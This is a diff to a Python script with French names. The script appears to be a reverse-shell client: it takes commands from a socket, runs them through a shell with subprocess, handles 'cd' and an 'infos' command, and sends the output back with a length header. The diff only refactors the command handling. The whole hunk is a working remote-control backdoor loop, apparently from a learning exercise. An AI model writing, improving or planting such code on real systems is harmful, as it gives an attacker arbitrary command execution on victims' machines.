@@ -27,28 +27,30 @@ while True:
     commande = commande_data.decode().strip()
     print("Commande : ", commande)
 
+    commande_split = commande.split(" ")
+
     if commande == "infos":
         reponse = platform.platform() + "|" + os.getcwd() + "\n"
+    elif len(commande_split) == 2 and commande_split[0] == "cd":
+        try:
+            os.chdir(commande_split[1].strip("'"))
+            reponse = f"Répertoire changé : {os.getcwd()}\n"
+        except FileNotFoundError:
+            reponse = "ERREUR : ce répertoire n'existe pas\n"
     else:
-        commande_split = commande.split(" ")
-        if len(commande_split) == 2 and commande_split[0] == "cd":
-            try:
-                os.chdir(commande_split[1])
-                reponse = f"Répertoire changé : {os.getcwd()}\n"
-            except FileNotFoundError:
-                reponse = "ERREUR : ce répertoire n'existe pas\n"
-        else:
-            resultat = subprocess.run(commande, shell=True, capture_output=True,
-                universal_newlines=True)
-            reponse = resultat.stdout + resultat.stderr
+        resultat = subprocess.run(commande, shell=True, capture_output=True,
+            universal_newlines=True)
+        reponse = resultat.stdout + resultat.stderr
 
     if not reponse:
         reponse = "Aucune sortie pour cette commande\n"
 
+    data_len = len(reponse.encode())
     reponse_encodee = reponse.encode()
     header = str(len(reponse_encodee)).zfill(13)
     print("header:", header)
     s.sendall(header.encode())
-    s.sendall(reponse_encodee)
+    if data_len > 0:
+        s.sendall(reponse_encodee)
 
 s.close()
